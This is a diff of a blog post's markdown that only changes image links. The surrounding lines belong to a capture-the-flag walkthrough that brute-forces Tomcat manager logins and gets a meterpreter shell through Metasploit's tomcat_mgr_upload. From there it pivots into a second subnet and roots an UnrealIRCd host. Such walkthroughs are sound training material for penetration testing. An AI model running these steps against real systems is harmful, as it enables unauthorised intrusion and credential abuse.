@@ -22,7 +22,7 @@ Let's jump in!
 ## Network Topology
 We have a switch between us and the first target. Followed by another switch between target 1 and target 2.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-11.png" >}}
+![](/images/2020/01/image-11.png)
 
 ## Enumeration
 We start our with our `nmap` scan to get an idea of what might one around on this subnet.
@@ -88,7 +88,7 @@ Command:
 
 Once inside we'll `search` for `finger`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-12.png" >}}
+![](/images/2020/01/image-12.png)
 
 We'll use the `finger_users` module.
 
@@ -107,7 +107,7 @@ Command:
 
 We are running this to essentially generate our own users list. We could use a pre-made Linux users list but this list will be specific to this machine. So we can save some time by not having to use usernames that aren't relevant.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-13.png" >}}
+![](/images/2020/01/image-13.png)
 
 We can now take these comma separated results, put them in a file and use them for any further modules. You could manually edit the file or we can run a quick `sed` on the file to fix it up for us.
 
@@ -116,7 +116,7 @@ Command:
 
 We will also want to use the `names.txt` file that was supplied to us as well. This is a list of just names. We'll run that as well and append the output of that to our new list.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-31.png" >}}
+![](/images/2020/01/image-31.png)
 
 Once we have that all completed, we'll use the `tomcat_mgr_login` module to see if we can get any valid logins.
 
@@ -125,11 +125,11 @@ Command:
 
 We set our `rhost`, `pass_file` and `user_file`. The first time we run this, we keep our passfile as default. Set our `rhost` to `target-1` and our `user_file` to our user created file. We don't get any results. We are going to rerun the module, this time with the `100-common-passwords.txt`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/target-1_user.gif" >}}
+![](/images/2020/01/target-1_user.gif)
 
 We get a credential set, `adeniyi`:`anamaria`. Now we want to leverage those credentials to leverage an Authenticated RCE. So again, we will `search` for `tomcat` inside `Metasploit` but this time we will add an additional search parameter. We will add `type:exploit` to our search. This will narrow down the results to exploits only.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-32.png" >}}
+![](/images/2020/01/image-32.png)
 
 Much like a previous CTF we've done. We want to use the `tomcat_mgr_upload` module.
 
@@ -146,11 +146,11 @@ Commands:
 `msf5> set lhost eth1`
 `msf5> run`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/tomcat_payload_1.gif" >}}
+![](/images/2020/01/tomcat_payload_1.gif)
 
 We get a `meterpreter` shell back! Now we need to identify `target-2`. Like before we start by looking at our IP address: `ifconfig`. We see the output is a bit different in a `meterpreter` shell.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-33.png" >}}
+![](/images/2020/01/image-33.png)
 
 There are two methods of enumerating our new subnet. The first is to use the Metasploit module, `ping_sweep`. The second is to write a quick bash command. We'll go over both. 
 
@@ -165,7 +165,7 @@ This will let us come back to the shell when we need it. It also gives us the ab
 Command:
 `msf5> search ping_sweep`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-34.png" >}}
+![](/images/2020/01/image-34.png)
 
 We will `use` the module.
 
@@ -178,7 +178,7 @@ Command:
 `msf5> set rhosts 192.142.193.1/24`
 `msf5> set session 3`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-35.png" >}}
+![](/images/2020/01/image-35.png)
 
 We see there are three hosts online. As predicted, .3 will be `target-2`
 
@@ -198,7 +198,7 @@ This is a pretty basic one-liner. We give `i` a range between 1 and 255. Then we
 
 If you use this method, you will notice how much faster it is than the module.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-36.png" >}}
+![](/images/2020/01/image-36.png)
 
 Now in order for `Metasploit` to leverage our newly comprised system, we need to give ourselves a route to this subnet. So in oder to do this we need to `background` our current session if we are still in it.
 
@@ -226,7 +226,7 @@ Here's a break down of the above.
 
 We can then issue `route print` to verify that everything has been entered correctly.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-37.png" >}}
+![](/images/2020/01/image-37.png)
 
 Now that our `route`s are setup, we can use the `portscan` modules to scan our newly found target, `192.142.193.3`.
 
@@ -240,7 +240,7 @@ Command:
 
 Then `run` the module.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-38.png" >}}
+![](/images/2020/01/image-38.png)
 
 We see there are three ports open but don't know the services. We can `curl` these ports on the target to get an idea of what might be running. We will drop into a `shell` on our already compromised host and issue some curls.
 
@@ -255,7 +255,7 @@ Command:
 `curl 192.142.193.3:6697`
 `curl 192.142.193.3:8067`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-39.png" >}}
+![](/images/2020/01/image-39.png)
 
 We get the same result back for each port. It's an IRC port expecting a connection. We need to do two things, setup routes to our new target and we need to setup a port forward to help identify the services. 
 
@@ -276,14 +276,14 @@ With this setup we can now `nmap` the port on our local machine and get our remo
 Command:
 `msf5> nmap -sC -p 1234 localhost`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-40.png" >}}
+![](/images/2020/01/image-40.png)
 
 Now we see that we have an UnrealIRCd service running. We can now `search` for unreal inside Metasploit to see what modules are available to us.
 
 Command:
 `msf5> search unreal`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-41.png" >}}
+![](/images/2020/01/image-41.png)
 
 Well, it looks like we only have one options. Since two are targeted at the game, Unreal Tournament. 
 
@@ -295,18 +295,18 @@ We check our module `options`. We want to set our `rhost` and our `payload`. Usi
 Command:
 `msf5> show payloads`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-42.png" >}}
+![](/images/2020/01/image-42.png)
 
 We will just go down the line, starting with payload 1. We set this similar to previous commands.
 
 Command:
 `msf5> set payload 1`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-43.png" >}}
+![](/images/2020/01/image-43.png)
 
 We then `run` the exploit.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/target-2_root.gif" >}}
+![](/images/2020/01/target-2_root.gif)
 
 We now have a shell on the second target! We can't actually change our directories until we upgrade our shell. There are [many ways](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldrcheatsheet) to do this. In this case (and most) I use `python`.
 
@@ -315,11 +315,11 @@ Command:
 
 This gives us a better shell experience.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-44.png" >}}
+![](/images/2020/01/image-44.png)
 
 We can now head over to `/root/` and get our flag!
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-45.png" >}}
+![](/images/2020/01/image-45.png)
 
 This was a very fun, basic CTF. What's really enjoyable here is that it's more than the standard CTF machine would have, since it's two machines in total. It demonstrates a few key items that many pentesters should know. We could have branched out more into `proxychains` which I'm sure we will do in the future!
 
